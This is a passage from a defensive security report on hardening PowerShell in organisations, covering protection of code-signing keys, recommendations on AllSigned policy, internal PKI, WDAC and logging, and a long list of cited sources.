The security of the entire code signing process hinges on the protection of the signer's private key. If this key is compromised, an attacker can sign malicious code that will be trusted by the entire organization. Therefore, strong practices for key management are non-negotiable.

* **Individual Workstations:** When developers are signing on their own machines, the private key should be stored in the Windows certificate store, which is protected by the Windows Data Protection API (DPAPI). The certificate should be marked as non-exportable if possible to prevent it from being easily copied.  
* **Automated Systems (CI/CD):** For build servers or other automated signing services that require a .pfx file, the private key is only as secure as the password protecting it. This password must be treated as a high-value secret and stored in a secure vault like Azure Key Vault, HashiCorp Vault, or other secrets management solutions. It should never be stored in plaintext in configuration files or source code.  
* **High-Security Environments:** For the highest level of assurance, code signing certificates should be stored on FIPS 140-2 compliant hardware security modules (HSMs) or hardware tokens (such as a YubiKey). These devices ensure that the private key never leaves the hardware and often require a physical interaction (like a touch or PIN entry) for each signing operation, providing strong protection against remote theft.

By implementing these measures, organizations can ensure that their code signing infrastructure is not only effective and convenient but also resilient against compromise.

## **Conclusions and Recommendations**

The security of PowerShell is not a feature to be enabled but a continuous process of layered defense. The prevalent belief that the PowerShell Execution Policy is a security boundary is a dangerous misconception that serves as a gateway for "Living Off the Land" attacks. A truly resilient security posture requires a strategic, multi-faceted approach that addresses policy, infrastructure, process, and visibility.

Based on the comprehensive analysis, the following actions are recommended to build a defense-in-depth strategy against malicious PowerShell use:

1. **Immediately Dispel the Execution Policy Myth:** The first and most critical step is organizational education. All IT and security personnel must understand that the Execution Policy is a safety feature, not a security control. Security planning and resources should be directed away from simply managing this policy and toward implementing the more robust controls outlined below.  
2. **Enforce AllSigned via Group Policy as a Foundational Control:** Transition the organization's Execution Policy to AllSigned by using the "Turn on Script Execution" Group Policy setting. This is the only reliable method to enforce a mandatory code signing requirement that cannot be overridden locally. This action will serve as a catalyst, forcing the organization to mature its script management practices and adopt a secure development lifecycle for internal automation.  
3. **Establish an Internal PKI for Code Signing:** Deploy Active Directory Certificate Services to create an internal Certificate Authority. Configure and publish a custom code signing certificate template, granting enrollment permissions only to authorized personnel or service accounts. This provides a cost-effective and manageable source for trusted internal signatures.  
4. **Automate Trust Distribution:** Use Group Policy to distribute the internal CA's root certificate to the Trusted Root Certification Authorities and Trusted Publishers certificate stores on all domain-joined endpoints. This dual-pronged approach is essential to ensure that internally signed scripts are both cryptographically validated and run seamlessly without user-facing security prompts.  
5. **Implement a Comprehensive Signing Process:** Mandate that all internally developed PowerShell scripts are signed using Set-AuthenticodeSignature and all executables are signed using SignTool.exe. Critically, all signatures must be **timestamped** to ensure their long-term validity beyond the expiration of the signing certificate.  
6. **Adopt Windows Defender Application Control (WDAC) as the Primary Security Boundary:** Move beyond script signing to true application whitelisting by deploying WDAC.  
   * Always begin deployment in **Audit Mode** to gather data on application usage without disrupting operations.  
   * Create a base policy that trusts your internal code signing certificate. This will allow your signed scripts to run in FullLanguage mode while demoting all other untrusted scripts to the sandboxed ConstrainedLanguage mode, effectively neutralizing most script-based threats.  
   * WDAC provides superior kernel-level protection and is Microsoft's strategic, actively developed solution, making it the preferred choice over the legacy AppLocker technology.  
7. **Enable and Centralize Enhanced PowerShell Logging:** Enable Module Logging, Script Block Logging, and Transcription via Group Policy. Forward these logs to a centralized SIEM. This pervasive visibility is not only critical for threat hunting and incident response but is also a prerequisite for successfully deploying WDAC in Audit Mode.  
8. **Integrate Signing into the Developer Workflow to Reduce Friction:** To ensure adoption and compliance, make the signing process as seamless as possible. Configure custom tasks or use extensions within VS Code to enable one-click or automated "sign-on-save" functionality. Removing security friction is paramount to the long-term success and sustainability of the security policy.

By executing this comprehensive strategy, an organization can transform PowerShell from a high-risk attack vector into a securely managed and powerful automation tool, effectively fortifying the enterprise against a significant class of modern cyber threats.

#### **Works cited**

1. What you need to know about PowerShell attacks \- Cybereason, accessed October 28, 2025, [https://www.cybereason.com/blog/fileless-malware-powershell](https://www.cybereason.com/blog/fileless-malware-powershell)  
2. about\_Execution\_Policies \- PowerShell | Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.5)  
3. Why does PowerShell have an execution policy? \- Stack Overflow, accessed October 28, 2025, [https://stackoverflow.com/questions/35139763/why-does-powershell-have-an-execution-policy](https://stackoverflow.com/questions/35139763/why-does-powershell-have-an-execution-policy)  
4. Best practice \- ExecutionPolicy : r/PowerShell \- Reddit, accessed October 28, 2025, [https://www.reddit.com/r/PowerShell/comments/15ay9ns/best\_practice\_executionpolicy/](https://www.reddit.com/r/PowerShell/comments/15ay9ns/best_practice_executionpolicy/)  
5. PowerShell Execution Policy Bypass: How Attackers Do It and How ..., accessed October 28, 2025, [https://www.realtimecyber.net/blog/powershell-execution-policy-bypass-how-attackers-do-it-and-how-to-prevent-it](https://www.realtimecyber.net/blog/powershell-execution-policy-bypass-how-attackers-do-it-and-how-to-prevent-it)  
6. Detection: Malicious PowerShell Process \- Execution Policy Bypass, accessed October 28, 2025, [https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/](https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/)  
7. is there any Security risks when bypassing the Execution Policy in PowerShell?, accessed October 28, 2025, [https://stackoverflow.com/questions/65958561/is-there-any-security-risks-when-bypassing-the-execution-policy-in-powershell](https://stackoverflow.com/questions/65958561/is-there-any-security-risks-when-bypassing-the-execution-policy-in-powershell)  
8. How to Test for Windows \- PowerShell Execution Policy Bypass \- Blumira, accessed October 28, 2025, [https://www.blumira.com/integration/powershell-execution-policy-bypass/](https://www.blumira.com/integration/powershell-execution-policy-bypass/)  
9. 15 Ways to Bypass the PowerShell Execution Policy \- NetSPI, accessed October 28, 2025, [https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/](https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/)  
10. Living-Off-the-Land (LOTL) Attacks: Everything You Need to Know \- Kiteworks, accessed October 28, 2025, [https://www.kiteworks.com/risk-compliance-glossary/living-off-the-land-attacks/](https://www.kiteworks.com/risk-compliance-glossary/living-off-the-land-attacks/)  
11. What is Fileless Malware? PowerShell Exploited \- Varonis, accessed October 28, 2025, [https://www.varonis.com/blog/fileless-malware](https://www.varonis.com/blog/fileless-malware)  
12. What Is PowerShell Exploit? How It Works & Examples \- Twingate, accessed October 28, 2025, [https://www.twingate.com/blog/glossary/powershell-exploits-attack](https://www.twingate.com/blog/glossary/powershell-exploits-attack)  
13. The different stages of a PowerShell attack \- CalCom Software, accessed October 28, 2025, [https://calcomsoftware.com/the-different-stages-of-a-powershell-attack/](https://calcomsoftware.com/the-different-stages-of-a-powershell-attack/)  
14. PowerShell: How to Defend Against Malicious PowerShell Attacks | Rapid7 Blog, accessed October 28, 2025, [https://www.rapid7.com/blog/post/2018/09/27/the-powershell-boogeyman-how-to-defend-against-malicious-powershell-attacks/](https://www.rapid7.com/blog/post/2018/09/27/the-powershell-boogeyman-how-to-defend-against-malicious-powershell-attacks/)  
15. PowerShell Quick Tips : Bypassing execution policy \- YouTube, accessed October 28, 2025, [https://www.youtube.com/watch?v=MqsVydfjMQ8](https://www.youtube.com/watch?v=MqsVydfjMQ8)  
16. Windows: Potential PowerShell Execution Policy Tampering \- ProcCreation, accessed October 28, 2025, [https://help.fortinet.com/fsiem/Public\_Resource\_Access/7\_1\_0/rules/PH\_RULE\_Potential\_PowerShell\_Execution\_Policy\_Tampering\_ProcCreation.htm](https://help.fortinet.com/fsiem/Public_Resource_Access/7_1_0/rules/PH_RULE_Potential_PowerShell_Execution_Policy_Tampering_ProcCreation.htm)  
17. PowerShell Execution Policy \- Netwrix, accessed October 28, 2025, [https://netwrix.com/en/resources/blog/powershell-execution-policy/](https://netwrix.com/en/resources/blog/powershell-execution-policy/)  
18. What is the point of Powershell execution policies? \- Reddit, accessed October 28, 2025, [https://www.reddit.com/r/PowerShell/comments/i4xa0/what\_is\_the\_point\_of\_powershell\_execution\_policies/](https://www.reddit.com/r/PowerShell/comments/i4xa0/what_is_the_point_of_powershell_execution_policies/)  
19. Set-ExecutionPolicy (Microsoft.PowerShell.Security), accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.5)  
20. How to prevent powershell attacks \- CalCom Software, accessed October 28, 2025, [https://calcomsoftware.com/basic-steps-for-powershell-attacks-prevention/](https://calcomsoftware.com/basic-steps-for-powershell-attacks-prevention/)  
21. about\_Group\_Policy\_Settings \- PowerShell | Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_group\_policy\_settings?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings?view=powershell-7.5)  
22. Internal code-signing certificate on Windows \- Information Security Stack Exchange, accessed October 28, 2025, [https://security.stackexchange.com/questions/51647/internal-code-signing-certificate-on-windows](https://security.stackexchange.com/questions/51647/internal-code-signing-certificate-on-windows)  
23. Creating Signed PowerShell scripts \- Reddit, accessed October 28, 2025, [https://www.reddit.com/r/PowerShell/comments/xcnhg8/creating\_signed\_powershell\_scripts/](https://www.reddit.com/r/PowerShell/comments/xcnhg8/creating_signed_powershell_scripts/)  
24. Create a code signing cert for App Control for Business | Microsoft ..., accessed October 28, 2025, [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/create-code-signing-cert-for-appcontrol](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/create-code-signing-cert-for-appcontrol)  
25. internal Domain CA code signing cert : r/PowerShell \- Reddit, accessed October 28, 2025, [https://www.reddit.com/r/PowerShell/comments/1enrghz/internal\_domain\_ca\_code\_signing\_cert/](https://www.reddit.com/r/PowerShell/comments/1enrghz/internal_domain_ca_code_signing_cert/)  
26. about\_Signing \- PowerShell | Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_signing?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_signing?view=powershell-7.5)  
27. Deploying signing certificate using GPO | ManageEngine Patch Connect Plus, accessed October 28, 2025, [https://www.manageengine.com/sccm-third-party-patch-management/kb/deploy-signing-certificates-using-gpo-how-to.html](https://www.manageengine.com/sccm-third-party-patch-management/kb/deploy-signing-certificates-using-gpo-how-to.html)  
28. Distribute certificates to Windows devices by using Group Policy ..., accessed October 28, 2025, [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/distribute-certificates-group-policy](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/distribute-certificates-group-policy)  
29. How to sign a PowerShell script easily? \- Super User, accessed October 28, 2025, [https://superuser.com/questions/94241/how-to-sign-a-powershell-script-easily](https://superuser.com/questions/94241/how-to-sign-a-powershell-script-easily)  
30. Set-AuthenticodeSignature (Microsoft.PowerShell.Security ..., accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature?view=powershell-7.5)  
31. How to Sign a PowerShell Script (a Step-By-Step Guide) \- Code Signing Store, accessed October 28, 2025, [https://codesigningstore.com/how-to-sign-a-powershell-script](https://codesigningstore.com/how-to-sign-a-powershell-script)  
32. Code Signing 101: How to Sign an Exe or Application, accessed October 28, 2025, [https://cheapsslsecurity.com/blog/code-signing-101-how-to-sign-an-exe-or-application/](https://cheapsslsecurity.com/blog/code-signing-101-how-to-sign-an-exe-or-application/)  
33. Signing executables with Microsoft SignTool.exe using AWS CloudHSM-backed certificates, accessed October 28, 2025, [https://aws.amazon.com/blogs/security/signing-executables-with-microsoft-signtool-exe-using-aws-cloudhsm-backed-certificates/](https://aws.amazon.com/blogs/security/signing-executables-with-microsoft-signtool-exe-using-aws-cloudhsm-backed-certificates/)  
34. How to Use Microsoft SignTool to Sign EXE Files? A Quick Guide, accessed October 28, 2025, [https://www.ssl2buy.com/wiki/signing-executable-files-using-microsoft-signtool](https://www.ssl2buy.com/wiki/signing-executable-files-using-microsoft-signtool)  
35. Use App Control to secure PowerShell \- Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control?view=powershell-7.5)  
36. WDAC policy and Powershell constrained language mode \- Microsoft Q\&A, accessed October 28, 2025, [https://learn.microsoft.com/en-us/answers/questions/1487212/wdac-policy-and-powershell-constrained-language-mo](https://learn.microsoft.com/en-us/answers/questions/1487212/wdac-policy-and-powershell-constrained-language-mo)  
37. about\_Language\_Modes \- PowerShell \- Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_language\_modes?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5)  
38. Applocker and PowerShell: how do they tightly work together?, accessed October 28, 2025, [https://p0w3rsh3ll.wordpress.com/2019/03/07/applocker-and-powershell-how-do-they-tightly-work-together/](https://p0w3rsh3ll.wordpress.com/2019/03/07/applocker-and-powershell-how-do-they-tightly-work-together/)  
39. PowerShell Constrained Language mode | uberAgent 7.4.1 \- Citrix Product Documentation, accessed October 28, 2025, [https://docs.citrix.com/en-us/uberagent/7-4-1/kb/data-collection/powershell-constrained-language-mode](https://docs.citrix.com/en-us/uberagent/7-4-1/kb/data-collection/powershell-constrained-language-mode)  
40. Windows 11 24H2: PowerShell AppLocker/WDAC Script Enforcement was broken for months \- BornCity, accessed October 28, 2025, [https://borncity.com/win/2025/06/02/windows-11-24h2-powershell-applocker-wdac-script-enforcement-was-broken-for-months/](https://borncity.com/win/2025/06/02/windows-11-24h2-powershell-applocker-wdac-script-enforcement-was-broken-for-months/)  
41. Application Control | Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/windows/iot/iot-enterprise/customize/application-control](https://learn.microsoft.com/en-us/windows/iot/iot-enterprise/customize/application-control)  
42. App Control and AppLocker Overview | Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol-and-applocker-overview](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol-and-applocker-overview)  
43. Windows Defender Application Control (WDAC) \- Powerful and Persistent Host-Based Protection \- Jonathan Beierle, accessed October 28, 2025, [https://beierle.win/2024-08-09-WDAC/](https://beierle.win/2024-08-09-WDAC/)  
44. The Windows Security Journey — Differences between “WDAC” and “AppLocker” \- Medium, accessed October 28, 2025, [https://medium.com/@boutnaru/the-windows-security-journey-differences-between-wdac-and-applocker-211e9f991e0f](https://medium.com/@boutnaru/the-windows-security-journey-differences-between-wdac-and-applocker-211e9f991e0f)  
45. How to Configure AppLocker to Block Scripts in Windows 11 or ..., accessed October 28, 2025, [https://winbuzzer.com/2024/04/07/how-to-configure-applocker-in-windows-10-to-block-a-script-from-running-xcxwbt/](https://winbuzzer.com/2024/04/07/how-to-configure-applocker-in-windows-10-to-block-a-script-from-running-xcxwbt/)  
46. mattifestation/WDACTools: A PowerShell module to facilitate building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies \- GitHub, accessed October 28, 2025, [https://github.com/mattifestation/WDACTools](https://github.com/mattifestation/WDACTools)  
47. How to Use App Control for Business (WDAC) to Secure Your Devices \- Patch My PC, accessed October 28, 2025, [https://patchmypc.com/blog/how-use-app-control-business/](https://patchmypc.com/blog/how-use-app-control-business/)  
48. Deploying App Control for Business policies \- Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/appcontrol-deployment-guide](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/appcontrol-deployment-guide)  
49. How to build and Deploy WDAC Policy Wizard \#447 \- GitHub, accessed October 28, 2025, [https://github.com/MicrosoftDocs/WDAC-Toolkit/discussions/447](https://github.com/MicrosoftDocs/WDAC-Toolkit/discussions/447)  
50. Deploy Microsoft Defender Application Control policies without forcing a reboot, accessed October 28, 2025, [https://petervanderwoude.nl/post/deploy-microsoft-defender-application-control-policies-without-forcing-a-reboot/](https://petervanderwoude.nl/post/deploy-microsoft-defender-application-control-policies-without-forcing-a-reboot/)  
51. Create Policies With App Control Policy Wizard \- CloudInfra, accessed October 28, 2025, [https://cloudinfra.net/create-policies-with-app-control-policy-wizard/](https://cloudinfra.net/create-policies-with-app-control-policy-wizard/)  
52. App Control for Business Wizard Base Policy Creation | Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/appcontrol-wizard-create-base-policy](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/appcontrol-wizard-create-base-policy)  
53. Script Enforcement and PowerShell Constrained Language Mode in App Control Policies, accessed October 28, 2025, [https://github.com/HotCakeX/Harden-Windows-Security/wiki/Script-Enforcement-and-PowerShell-Constrained-Language-Mode-in-WDAC-App-Control-Policies](https://github.com/HotCakeX/Harden-Windows-Security/wiki/Script-Enforcement-and-PowerShell-Constrained-Language-Mode-in-WDAC-App-Control-Policies)  
54. Deploy App Control policies using Mobile Device Management (MDM) \- Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/deploy-appcontrol-policies-using-intune](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/deploy-appcontrol-policies-using-intune)  
55. Windows Defender Application Control (WDAC) Implementation \- Part 4: Putting It All Together \- MRGTech, accessed October 28, 2025, [https://www.mrgtech.net/windows-defender-application-control-wdac-implementation-part-4-putting-it-all-together/](https://www.mrgtech.net/windows-defender-application-control-wdac-implementation-part-4-putting-it-all-together/)  
56. Greater Visibility Through PowerShell Logging | Mandiant | Google Cloud Blog, accessed October 28, 2025, [https://cloud.google.com/blog/topics/threat-intelligence/greater-visibility/](https://cloud.google.com/blog/topics/threat-intelligence/greater-visibility/)  
57. PowerShell Security Best Practices \- ReliaQuest, accessed October 28, 2025, [https://reliaquest.com/blog/powershell-security-best-practices/](https://reliaquest.com/blog/powershell-security-best-practices/)  
58. Powershell logging for Blue Teamers | by Shreenkhala Bhattarai | InfoSecStories \- Medium, accessed October 28, 2025, [https://medium.com/infosecstories/powershell-logging-for-blue-teamers-c7d21660ea5d](https://medium.com/infosecstories/powershell-logging-for-blue-teamers-c7d21660ea5d)  
59. 18.10.87.1 Ensure 'Turn on PowerShell Script Block Logging' is... | Tenable®, accessed October 28, 2025, [https://www.tenable.com/audits/items/CIS\_Microsoft\_Windows\_10\_Stand-alone\_v2.0.0\_L1.audit:ce8ce0962b4e31cd7b6b5742b040adfc](https://www.tenable.com/audits/items/CIS_Microsoft_Windows_10_Stand-alone_v2.0.0_L1.audit:ce8ce0962b4e31cd7b6b5742b040adfc)  
60. Configure PowerShell logging to see PowerShell anomalies in Splunk UBA \- Splunk Docs, accessed October 28, 2025, [https://help.splunk.com/en/security-offerings/splunk-user-behavior-analytics/get-data-in/5.4.0/add-other-data-to-splunk-uba/configure-powershell-logging-to-see-powershell-anomalies-in-splunk-uba](https://help.splunk.com/en/security-offerings/splunk-user-behavior-analytics/get-data-in/5.4.0/add-other-data-to-splunk-uba/configure-powershell-logging-to-see-powershell-anomalies-in-splunk-uba)  
61. AppLocker best practices \- 4sysops, accessed October 28, 2025, [https://4sysops.com/archives/applocker-best-practices/](https://4sysops.com/archives/applocker-best-practices/)  
62. PowerShell in Visual Studio Code, accessed October 28, 2025, [https://code.visualstudio.com/docs/languages/powershell](https://code.visualstudio.com/docs/languages/powershell)  
63. Using Visual Studio Code for PowerShell Development \- Microsoft Learn, accessed October 28, 2025, [https://learn.microsoft.com/en-us/powershell/scripting/dev-cross-plat/vscode/using-vscode?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/scripting/dev-cross-plat/vscode/using-vscode?view=powershell-7.5)  
64. Visual Studio Code Unsigned Powershell Scripts \- Stack Overflow, accessed October 28, 2025, [https://stackoverflow.com/questions/47023796/visual-studio-code-unsigned-powershell-scripts](https://stackoverflow.com/questions/47023796/visual-studio-code-unsigned-powershell-scripts)  
65. Is there a good way to automatically sign my before run in VScode ..., accessed October 28, 2025, [https://www.reddit.com/r/PowerShell/comments/i62tr1/is\_there\_a\_good\_way\_to\_automatically\_sign\_my/](https://www.reddit.com/r/PowerShell/comments/i62tr1/is_there_a_good_way_to_automatically_sign_my/)  
66. Sign On Save | PowerShell Pro Tools, accessed October 28, 2025, [https://docs.poshtools.com/powershell-pro-tools-documentation/visual-studio-code/sign-on-save](https://docs.poshtools.com/powershell-pro-tools-documentation/visual-studio-code/sign-on-save)